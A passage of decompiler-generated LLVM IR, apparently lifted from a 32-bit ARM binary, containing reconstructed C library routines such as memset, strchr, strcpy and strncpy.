  uselistorder i32 %v3_116c8, { 1, 0 }
  uselistorder i32 %v1_11684, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_116ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_116e8, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_1170c = inttoptr i32 %arg2 to i8*
  %v3_1170c = call i32 @_memcpy(i8* %v2_1170c, i32 %arg1)
  ret i32 %v3_1170c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11710 = load i32, i32* @r0, align 4
  %v1_11710 = load i32, i32* @r1, align 4
  %v2_11710 = inttoptr i32 %v0_11710 to i8*
  %v3_11710 = call i32 @_memcpy(i8* %v2_11710, i32 %v1_11710)
  ret i32 %v3_11710
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_11724 = load i32, i32* @r2, align 4
  %v8_11724 = icmp eq i32 %v0_11724, 8
  store i1 %v8_11724, i1* %cpsr_z.global-to-local, align 1
  %v5_11728 = icmp slt i32 %v0_11724, 8
  br i1 %v5_11728, label %dec_label_pc_11788, label %dec_label_pc_1172c

dec_label_pc_1172c:                               ; preds = %entry
  %v4_1172c = mul i32 %arg2, 256
  %v5_1172c = or i32 %v4_1172c, %arg2
  %v4_11730 = mul i32 %v5_1172c, 65536
  %v5_11730 = or i32 %v4_11730, %v5_1172c
  store i32 %v5_11730, i32* %r1.global-to-local, align 4
  %v1_1173457 = urem i32 %tmp, 4
  %v2_1173458 = icmp eq i32 %v1_1173457, 0
  store i1 %v2_1173458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1173458, label %dec_label_pc_11744, label %bb

bb:                                               ; preds = %dec_label_pc_1172c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1172c ]
  %v3_1173859 = phi i32 [ %v6_11738, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1172c ]
  %v4_11738 = inttoptr i32 %v3_1173859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11738, align 1
  %v5_11738 = load i32, i32* %r3.global-to-local, align 4
  %v6_11738 = add i32 %v5_11738, 1
  store i32 %v6_11738, i32* %r3.global-to-local, align 4
  %v0_1173c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11748.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1173c.pr, label %dec_label_pc_11744, label %.thread

.thread:                                          ; preds = %bb
  %v2_1173c = add i32 %v0_11748.pr.pre, -1
  store i32 %v2_1173c, i32* @r2, align 4
  %v1_11734 = urem i32 %v6_11738, 4
  %v2_11734 = icmp eq i32 %v1_11734, 0
  store i1 %v2_11734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11734, label %dec_label_pc_11744, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11738.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11738.pre to i8
  br label %bb

dec_label_pc_11744:                               ; preds = %.thread, %bb, %dec_label_pc_1172c
  %v0_1175028 = phi i32 [ %tmp, %dec_label_pc_1172c ], [ %v6_11738, %bb ], [ %v6_11738, %.thread ]
  %v0_11748.pr = phi i32 [ %v0_11724, %dec_label_pc_1172c ], [ %v0_11748.pr.pre, %bb ], [ %v2_1173c, %.thread ]
  %v0_11744 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11744, i32* @ip, align 4
  %v8_1174810 = icmp eq i32 %v0_11748.pr, 8
  store i1 %v8_1174810, i1* %cpsr_z.global-to-local, align 1
  %v5_1174c11 = icmp slt i32 %v0_11748.pr, 8
  br i1 %v5_1174c11, label %dec_label_pc_11788, label %dec_label_pc_11750.preheader

dec_label_pc_11750.preheader:                     ; preds = %dec_label_pc_11744
  %v1_1175046 = inttoptr i32 %v0_1175028 to i32*
  store i32 %v0_11744, i32* %v1_1175046, align 4
  %v3_1175047 = add i32 %v0_1175028, 4
  %v4_1175048 = inttoptr i32 %v3_1175047 to i32*
  %v5_1175049 = load i32, i32* @ip, align 4
  store i32 %v5_1175049, i32* %v4_1175048, align 4
  %v6_1175050 = add i32 %v0_1175028, 8
  store i32 %v6_1175050, i32* %r3.global-to-local, align 4
  %v0_1175451 = load i32, i32* @r2, align 4
  %v1_1175452 = add i32 %v0_1175451, -8
  store i32 %v1_1175452, i32* %r2.global-to-local, align 4
  %v5_1175c53 = icmp slt i32 %v1_1175452, 8
  br i1 %v5_1175c53, label %dec_label_pc_11750.dec_label_pc_11788.loopexit_crit_edge, label %dec_label_pc_11760

dec_label_pc_11760:                               ; preds = %dec_label_pc_11750.preheader, %dec_label_pc_11748.dec_label_pc_11750_crit_edge
  %v6_1175055 = phi i32 [ %v6_11750, %dec_label_pc_11748.dec_label_pc_11750_crit_edge ], [ %v6_1175050, %dec_label_pc_11750.preheader ]
  %v0_1175054 = phi i32 [ %v12_1177c, %dec_label_pc_11748.dec_label_pc_11750_crit_edge ], [ %v0_1175028, %dec_label_pc_11750.preheader ]
  %v1_11760 = inttoptr i32 %v6_1175055 to i32*
  %v2_11760 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11760, i32* %v1_11760, align 4
  %v3_11760 = add i32 %v0_1175054, 12
  %v4_11760 = inttoptr i32 %v3_11760 to i32*
  %v5_11760 = load i32, i32* @ip, align 4
  store i32 %v5_11760, i32* %v4_11760, align 4
  %v6_11760 = add i32 %v0_1175054, 16
  store i32 %v6_11760, i32* %r3.global-to-local, align 4
  %v0_11764 = load i32, i32* %r2.global-to-local, align 4
  %v1_11764 = add i32 %v0_11764, -8
  store i32 %v1_11764, i32* %r2.global-to-local, align 4
  %v5_1176c = icmp slt i32 %v1_11764, 8
  br i1 %v5_1176c, label %dec_label_pc_11760.dec_label_pc_11788.loopexit_crit_edge, label %dec_label_pc_11770

dec_label_pc_11770:                               ; preds = %dec_label_pc_11760
  %v1_11770 = inttoptr i32 %v6_11760 to i32*
  %v2_11770 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11770, i32* %v1_11770, align 4
  %v3_11770 = add i32 %v0_1175054, 20
  %v4_11770 = inttoptr i32 %v3_11770 to i32*
  %v5_11770 = load i32, i32* @ip, align 4
  store i32 %v5_11770, i32* %v4_11770, align 4
  %v6_11770 = add i32 %v0_1175054, 24
  store i32 %v6_11770, i32* %r3.global-to-local, align 4
  %v0_11774 = load i32, i32* %r2.global-to-local, align 4
  %v1_11774 = add i32 %v0_11774, -8
  store i32 %v1_11774, i32* %r2.global-to-local, align 4
  %v5_1177c = icmp slt i32 %v1_11774, 8
  br i1 %v5_1177c, label %dec_label_pc_11770.dec_label_pc_11788.loopexit_crit_edge, label %dec_label_pc_11748

dec_label_pc_11748:                               ; preds = %dec_label_pc_11770
  %v7_1177c = inttoptr i32 %v6_11770 to i32*
  %v8_1177c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1177c, i32* %v7_1177c, align 4
  %v9_1177c = add i32 %v0_1175054, 28
  %v10_1177c = inttoptr i32 %v9_1177c to i32*
  %v11_1177c = load i32, i32* @ip, align 4
  store i32 %v11_1177c, i32* %v10_1177c, align 4
  %v12_1177c = add i32 %v0_1175054, 32
  store i32 %v12_1177c, i32* %r3.global-to-local, align 4
  %v6_11780 = load i32, i32* %r2.global-to-local, align 4
  %v7_11780 = add i32 %v6_11780, -8
  store i32 %v7_11780, i32* %r2.global-to-local, align 4
  %v5_1174c = icmp slt i32 %v7_11780, 8
  br i1 %v5_1174c, label %dec_label_pc_11748.dec_label_pc_11788.loopexit_crit_edge, label %dec_label_pc_11748.dec_label_pc_11750_crit_edge

dec_label_pc_11748.dec_label_pc_11750_crit_edge:  ; preds = %dec_label_pc_11748
  %v2_11750.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11750 = inttoptr i32 %v12_1177c to i32*
  store i32 %v2_11750.pre, i32* %v1_11750, align 4
  %v3_11750 = add i32 %v0_1175054, 36
  %v4_11750 = inttoptr i32 %v3_11750 to i32*
  %v5_11750 = load i32, i32* @ip, align 4
  store i32 %v5_11750, i32* %v4_11750, align 4
  %v6_11750 = add i32 %v0_1175054, 40
  store i32 %v6_11750, i32* %r3.global-to-local, align 4
  %v0_11754 = load i32, i32* %r2.global-to-local, align 4
  %v1_11754 = add i32 %v0_11754, -8
  store i32 %v1_11754, i32* %r2.global-to-local, align 4
  %v5_1175c = icmp slt i32 %v1_11754, 8
  br i1 %v5_1175c, label %dec_label_pc_11750.dec_label_pc_11788.loopexit_crit_edge, label %dec_label_pc_11760

dec_label_pc_11750.dec_label_pc_11788.loopexit_crit_edge: ; preds = %dec_label_pc_11748.dec_label_pc_11750_crit_edge, %dec_label_pc_11750.preheader
  %v1_11754.lcssa = phi i32 [ %v1_1175452, %dec_label_pc_11750.preheader ], [ %v1_11754, %dec_label_pc_11748.dec_label_pc_11750_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11788

dec_label_pc_11748.dec_label_pc_11788.loopexit_crit_edge: ; preds = %dec_label_pc_11748
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11788

dec_label_pc_11760.dec_label_pc_11788.loopexit_crit_edge: ; preds = %dec_label_pc_11760
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11788

dec_label_pc_11770.dec_label_pc_11788.loopexit_crit_edge: ; preds = %dec_label_pc_11770
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11788

dec_label_pc_11788:                               ; preds = %dec_label_pc_11744, %dec_label_pc_11750.dec_label_pc_11788.loopexit_crit_edge, %dec_label_pc_11748.dec_label_pc_11788.loopexit_crit_edge, %dec_label_pc_11760.dec_label_pc_11788.loopexit_crit_edge, %dec_label_pc_11770.dec_label_pc_11788.loopexit_crit_edge, %entry
  %v0_11790 = phi i32 [ %v0_11724, %entry ], [ %v1_11774, %dec_label_pc_11770.dec_label_pc_11788.loopexit_crit_edge ], [ %v1_11764, %dec_label_pc_11760.dec_label_pc_11788.loopexit_crit_edge ], [ %v7_11780, %dec_label_pc_11748.dec_label_pc_11788.loopexit_crit_edge ], [ %v1_11754.lcssa, %dec_label_pc_11750.dec_label_pc_11788.loopexit_crit_edge ], [ %v0_11748.pr, %dec_label_pc_11744 ]
  %v2_11788 = icmp eq i32 %v0_11790, 0
  store i1 %v2_11788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11788, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11788
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11788
  %v1_11790 = sub i32 7, %v0_11790
  store i32 %v1_11790, i32* %r2.global-to-local, align 4
  %v3_11794 = mul i32 %v1_11790, 4
  %v4_11794 = add i32 %v3_11794, ptrtoint (i32* @global_var_1179c.692 to i32)
  call void @__pseudo_branch(i32 %v4_11794)
  %v0_1179c = load i32, i32* %r1.global-to-local, align 4
  %v1_1179c = trunc i32 %v0_1179c to i8
  %v2_1179c = load i32, i32* %r3.global-to-local, align 4
  %v3_1179c = inttoptr i32 %v2_1179c to i8*
  store i8 %v1_1179c, i8* %v3_1179c, align 1
  %v4_1179c = load i32, i32* %r3.global-to-local, align 4
  %v5_1179c = add i32 %v4_1179c, 1
  store i32 %v5_1179c, i32* %r3.global-to-local, align 4
  %v0_117a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_117a0 = trunc i32 %v0_117a0 to i8
  %v3_117a0 = inttoptr i32 %v5_1179c to i8*
  store i8 %v1_117a0, i8* %v3_117a0, align 1
  %v4_117a0 = load i32, i32* %r3.global-to-local, align 4
  %v5_117a0 = add i32 %v4_117a0, 1
  store i32 %v5_117a0, i32* %r3.global-to-local, align 4
  %v0_117a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_117a4 = trunc i32 %v0_117a4 to i8
  %v3_117a4 = inttoptr i32 %v5_117a0 to i8*
  store i8 %v1_117a4, i8* %v3_117a4, align 1
  %v4_117a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_117a4 = add i32 %v4_117a4, 1
  store i32 %v5_117a4, i32* %r3.global-to-local, align 4
  %v0_117a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_117a8 = trunc i32 %v0_117a8 to i8
  %v3_117a8 = inttoptr i32 %v5_117a4 to i8*
  store i8 %v1_117a8, i8* %v3_117a8, align 1
  %v4_117a8 = load i32, i32* %r3.global-to-local, align 4
  %v5_117a8 = add i32 %v4_117a8, 1
  store i32 %v5_117a8, i32* %r3.global-to-local, align 4
  %v0_117ac = load i32, i32* %r1.global-to-local, align 4
  %v1_117ac = trunc i32 %v0_117ac to i8
  %v3_117ac = inttoptr i32 %v5_117a8 to i8*
  store i8 %v1_117ac, i8* %v3_117ac, align 1
  %v4_117ac = load i32, i32* %r3.global-to-local, align 4
  %v5_117ac = add i32 %v4_117ac, 1
  store i32 %v5_117ac, i32* %r3.global-to-local, align 4
  %v0_117b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_117b0 = trunc i32 %v0_117b0 to i8
  %v3_117b0 = inttoptr i32 %v5_117ac to i8*
  store i8 %v1_117b0, i8* %v3_117b0, align 1
  %v4_117b0 = load i32, i32* %r3.global-to-local, align 4
  %v5_117b0 = add i32 %v4_117b0, 1
  store i32 %v5_117b0, i32* %r3.global-to-local, align 4
  %v0_117b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_117b4 = trunc i32 %v0_117b4 to i8
  %v3_117b4 = inttoptr i32 %v5_117b0 to i8*
  store i8 %v1_117b4, i8* %v3_117b4, align 1
  %v4_117b4 = load i32, i32* %r3.global-to-local, align 4
  %v5_117b4 = add i32 %v4_117b4, 1
  store i32 %v5_117b4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11750, { 1, 0 }
  uselistorder i32 %v12_1177c, { 1, 2, 0 }
  uselistorder i32 %v0_1175054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11748.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11738, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1172c, { 1, 0 }
  uselistorder i32 %v0_11724, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 21, 17, 14, 15, 16, 13, 18, 20, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 8, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 4, 1, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11788, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11760, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_117c4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_117c4 = phi i32 [ %v0_117c4.pre, %bb ], [ %v5_117c4, %bb3 ]
  %v0_117c0 = phi i32 [ %tmp, %bb ], [ %v5_117c0, %bb3 ]
  %v1_117c0 = inttoptr i32 %v0_117c0 to i8*
  %v2_117c0 = load i8, i8* %v1_117c0, align 1
  %v3_117c0 = zext i8 %v2_117c0 to i32
  store i32 %v3_117c0, i32* @r2, align 4
  %v1_117c4 = inttoptr i32 %v0_117c4 to i8*
  %v2_117c4 = load i8, i8* %v1_117c4, align 1
  %v3_117c4 = zext i8 %v2_117c4 to i32
  %v2_117c8 = icmp eq i8 %v2_117c0, 0
  br i1 %v2_117c8, label %.dec_label_pc_117d4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_117c4 = add i32 %v0_117c4, 1
  %v5_117c0 = add i32 %v0_117c0, 1
  %v10_117cc = icmp eq i8 %v2_117c0, %v2_117c4
  br i1 %v10_117cc, label %entry, label %dec_label_pc_117d4

.dec_label_pc_117d4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_117d4

dec_label_pc_117d4:                               ; preds = %bb3, %.dec_label_pc_117d4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_117d4_crit_edge ], [ %v3_117c0, %bb3 ]
  %v2_117d4.pre-phi = sub nsw i32 %.pn, %v3_117c4
  ret i32 %v2_117d4.pre-phi

; uselistorder directives
  uselistorder i32 %v0_117c0, { 1, 0 }
  uselistorder i32 %v0_117c4, { 1, 0 }
  uselistorder label %dec_label_pc_117d4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_11840 = load i32, i32* @r5, align 4
  %v9_11840 = load i32, i32* @r6, align 4
  %v1_11844 = urem i32 %arg1, 256
  br label %dec_label_pc_11864

dec_label_pc_1184c:                               ; preds = %dec_label_pc_11864
  %v3_1184c = load i8, i8* %.0, align 1
  %v4_1184c = zext i8 %v3_1184c to i32
  %v9_11850 = icmp eq i32 %v4_1184c, %v1_11844
  br i1 %v9_11850, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_1184c
  ret i32 %v1_11864

bb24:                                             ; preds = %dec_label_pc_1184c
  %v2_11858 = icmp eq i8 %v3_1184c, 0
  %v2_1185c = add i32 %v1_11864, 1
  %v3_1185c = inttoptr i32 %v2_1185c to i8*
  br i1 %v2_11858, label %dec_label_pc_11938, label %dec_label_pc_11864

dec_label_pc_11864:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_1185c, %bb24 ]
  %v1_11864 = ptrtoint i8* %.0 to i32
  %v2_11864 = urem i32 %v1_11864, 4
  %v3_11864 = icmp eq i32 %v2_11864, 0
  br i1 %v3_11864, label %dec_label_pc_1186c, label %dec_label_pc_1184c

dec_label_pc_1186c:                               ; preds = %dec_label_pc_11864
  %v4_1186c = mul nuw nsw i32 %v1_11844, 256
  %v5_1186c = or i32 %v4_1186c, %v1_11844
  %v4_11874 = mul i32 %v5_1186c, 65536
  %v5_11874 = or i32 %v4_11874, %v5_1186c
  br label %dec_label_pc_11878

dec_label_pc_11878:                               ; preds = %dec_label_pc_11930, %dec_label_pc_118b8, %dec_label_pc_1186c
  %v0_118dc = phi i32 [ %v1_11864, %dec_label_pc_1186c ], [ %v4_11878, %dec_label_pc_118b8 ], [ %v4_11878, %dec_label_pc_11930 ]
  %v1_11878 = inttoptr i32 %v0_118dc to i32*
  %v2_11878 = load i32, i32* %v1_11878, align 4
  %v4_11878 = add i32 %v0_118dc, 4
  %v2_11880 = xor i32 %v2_11878, %v5_11874
  %v2_1188c = add i32 %v2_11878, 2130640639
  %v1_11890 = sub i32 -1, %v2_11878
  %v2_11894 = xor i32 %v2_1188c, %v1_11890
  %v2_11898 = add i32 %v2_11880, 2130640639
  %v1_118a0 = sub i32 -1, %v2_11880
  %v2_118a4 = and i32 %v2_11894, -2130640640
  %v2_118a8 = xor i32 %v2_11898, %v1_118a0
  %v2_118ac = icmp eq i32 %v2_118a4, 0
  %v2_118b0 = and i32 %v2_118a8, -2130640640
  store i32 %v2_118b0, i32* @lr, align 4
  br i1 %v2_118ac, label %dec_label_pc_118b8, label %dec_label_pc_118c0

dec_label_pc_118b8:                               ; preds = %dec_label_pc_11878
  %v2_118b8 = icmp eq i32 %v2_118b0, 0
  br i1 %v2_118b8, label %dec_label_pc_11878, label %dec_label_pc_118c0

dec_label_pc_118c0:                               ; preds = %dec_label_pc_11878, %dec_label_pc_118b8
  %v2_118c0 = inttoptr i32 %v0_118dc to i8*
  %v3_118c0 = load i8, i8* %v2_118c0, align 1
  %v4_118c0 = zext i8 %v3_118c0 to i32
  %v1_118c8 = add i32 %v0_118dc, 1
  %v1_118cc = add i32 %v0_118dc, 2
  %v9_118d0 = icmp eq i32 %v4_118c0, %v1_11844
  %v1_118d4 = add i32 %v0_118dc, 3
  store i32 %v1_118d4, i32* @ip, align 4
  br i1 %v9_118d0, label %dec_label_pc_118dc, label %dec_label_pc_118e4

dec_label_pc_118dc:                               ; preds = %dec_label_pc_118c0
  store i32 %v6_11840, i32* @r5, align 4
  store i32 %v9_11840, i32* @r6, align 4
  ret i32 %v0_118dc

dec_label_pc_118e4:                               ; preds = %dec_label_pc_118c0
  %v2_118e4 = icmp eq i8 %v3_118c0, 0
  br i1 %v2_118e4, label %dec_label_pc_11938, label %dec_label_pc_118ec

dec_label_pc_118ec:                               ; preds = %dec_label_pc_118e4
  %v2_118ec = inttoptr i32 %v1_118c8 to i8*
  %v3_118ec = load i8, i8* %v2_118ec, align 1
  %v4_118ec = zext i8 %v3_118ec to i32
  %v9_118f0 = icmp eq i32 %v4_118ec, %v1_11844
  br i1 %v9_118f0, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_118ec
  store i32 %v6_11840, i32* @r5, align 4
  store i32 %v9_11840, i32* @r6, align 4
  ret i32 %v1_118c8

bb26:                                             ; preds = %dec_label_pc_118ec
  %v2_118f8 = icmp eq i8 %v3_118ec, 0
  br i1 %v2_118f8, label %dec_label_pc_11938, label %dec_label_pc_11900

dec_label_pc_11900:                               ; preds = %bb26
  %v2_11900 = inttoptr i32 %v1_118cc to i8*
  %v3_11900 = load i8, i8* %v2_11900, align 1
  %v4_11900 = zext i8 %v3_11900 to i32
  %v9_11904 = icmp eq i32 %v4_11900, %v1_11844
  br i1 %v9_11904, label %dec_label_pc_1190c, label %dec_label_pc_11914

dec_label_pc_1190c:                               ; preds = %dec_label_pc_11900
  store i32 %v6_11840, i32* @r5, align 4
  store i32 %v9_11840, i32* @r6, align 4
  ret i32 %v1_118cc

dec_label_pc_11914:                               ; preds = %dec_label_pc_11900
  %v2_11914 = icmp eq i8 %v3_11900, 0
  br i1 %v2_11914, label %dec_label_pc_11938, label %dec_label_pc_1191c

dec_label_pc_1191c:                               ; preds = %dec_label_pc_11914
  %v2_1191c = inttoptr i32 %v1_118d4 to i8*
  %v3_1191c = load i8, i8* %v2_1191c, align 1
  %v4_1191c = zext i8 %v3_1191c to i32
  %v9_11920 = icmp eq i32 %v4_1191c, %v1_11844
  br i1 %v9_11920, label %dec_label_pc_11928, label %dec_label_pc_11930

dec_label_pc_11928:                               ; preds = %dec_label_pc_1191c
  store i32 %v6_11840, i32* @r5, align 4
  store i32 %v9_11840, i32* @r6, align 4
  ret i32 %v1_118d4

dec_label_pc_11930:                               ; preds = %dec_label_pc_1191c
  %v2_11930 = icmp eq i8 %v3_1191c, 0
  br i1 %v2_11930, label %dec_label_pc_11938, label %dec_label_pc_11878

dec_label_pc_11938:                               ; preds = %bb24, %dec_label_pc_11930, %dec_label_pc_11914, %bb26, %dec_label_pc_118e4
  store i32 %v6_11840, i32* @r5, align 4
  store i32 %v9_11840, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11878, { 1, 0 }
  uselistorder i32 %v2_11878, { 0, 2, 1 }
  uselistorder i32 %v0_118dc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1186c, { 1, 0 }
  uselistorder i32 %v1_11864, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_11844, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_11840, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_11840, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_11938, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_118c0, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_11948 = sub i32 %arg1, %tmp
  %v1_1194c = add i32 %v2_11948, -1
  store i32 %v1_1194c, i32* %r2.global-to-local, align 4
  %v2_119504 = load i8, i8* %arg2, align 1
  %v5_119506 = add i32 %tmp, 1
  store i32 %v5_119506, i32* %r1.global-to-local, align 4
  %v2_119547 = icmp eq i8 %v2_119504, 0
  store i1 %v2_119547, i1* %cpsr_z.global-to-local, align 1
  %v5_119588 = inttoptr i32 %arg1 to i8*
  store i8 %v2_119504, i8* %v5_119588, align 1
  %v0_1195c9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1195c9, label %dec_label_pc_11960, label %dec_label_pc_11950.dec_label_pc_11950_crit_edge

dec_label_pc_11950.dec_label_pc_11950_crit_edge:  ; preds = %entry, %dec_label_pc_11950.dec_label_pc_11950_crit_edge
  %v0_11950.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_11958.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11950 = inttoptr i32 %v0_11950.pre to i8*
  %v2_11950 = load i8, i8* %v1_11950, align 1
  %v5_11950 = add i32 %v0_11950.pre, 1
  store i32 %v5_11950, i32* %r1.global-to-local, align 4
  %v2_11954 = icmp eq i8 %v2_11950, 0
  store i1 %v2_11954, i1* %cpsr_z.global-to-local, align 1
  %v4_11958 = add i32 %v5_11950, %v3_11958.pre
  %v5_11958 = inttoptr i32 %v4_11958 to i8*
  store i8 %v2_11950, i8* %v5_11958, align 1
  %v0_1195c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1195c, label %dec_label_pc_11960, label %dec_label_pc_11950.dec_label_pc_11950_crit_edge

dec_label_pc_11960:                               ; preds = %dec_label_pc_11950.dec_label_pc_11950_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11950.dec_label_pc_11950_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_11964 = icmp eq i32 %arg2, 3
  store i1 %v7_11964, i1* %cpsr_z.global-to-local, align 1
  %v1_1196c = add i32 %arg1, -1
  store i32 %v1_1196c, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_119e8, label %dec_label_pc_11974

dec_label_pc_11974:                               ; preds = %entry
  %v3_11974 = udiv i32 %arg2, 4
  store i32 %v3_11974, i32* @lr, align 4
  %v0_11978.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11978

dec_label_pc_11978:                               ; preds = %dec_label_pc_119c4, %dec_label_pc_11974
  %v2_11980 = phi i32 [ %v6_119b8, %dec_label_pc_119c4 ], [ %v1_1196c, %dec_label_pc_11974 ]
  %v0_11978 = phi i32 [ %v1_119c8, %dec_label_pc_119c4 ], [ %v0_11978.pre, %dec_label_pc_11974 ]
  %v1_11978 = inttoptr i32 %v0_11978 to i8*
  %v2_11978 = load i8, i8* %v1_11978, align 1
  %v3_11978 = zext i8 %v2_11978 to i32
  store i32 %v3_11978, i32* %r3.global-to-local, align 4
  %v2_1197c = icmp eq i8 %v2_11978, 0
  store i1 %v2_1197c, i1* %cpsr_z.global-to-local, align 1
  %v3_11980 = add i32 %v2_11980, 1
  %v4_11980 = inttoptr i32 %v3_11980 to i8*
  store i8 %v2_11978, i8* %v4_11980, align 1
  %v5_11980 = load i32, i32* @ip, align 4
  %v6_11980 = add i32 %v5_11980, 1
  store i32 %v6_11980, i32* @ip, align 4
  %v0_11984 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11984, label %dec_label_pc_119d4, label %dec_label_pc_11988

dec_label_pc_11988:                               ; preds = %dec_label_pc_11978
  %v0_11988 = load i32, i32* @r1, align 4
  %v1_11988 = add i32 %v0_11988, 1
  %v2_11988 = inttoptr i32 %v1_11988 to i8*
  %v3_11988 = load i8, i8* %v2_11988, align 1
  %v4_11988 = zext i8 %v3_11988 to i32
  store i32 %v4_11988, i32* %r3.global-to-local, align 4
  %v2_1198c = icmp eq i8 %v3_11988, 0
  store i1 %v2_1198c, i1* %cpsr_z.global-to-local, align 1
  %v3_11990 = add i32 %v5_11980, 2
  %v4_11990 = inttoptr i32 %v3_11990 to i8*
  store i8 %v3_11988, i8* %v4_11990, align 1
  %v5_11990 = load i32, i32* @ip, align 4
  %v6_11990 = add i32 %v5_11990, 1
  store i32 %v6_11990, i32* @ip, align 4
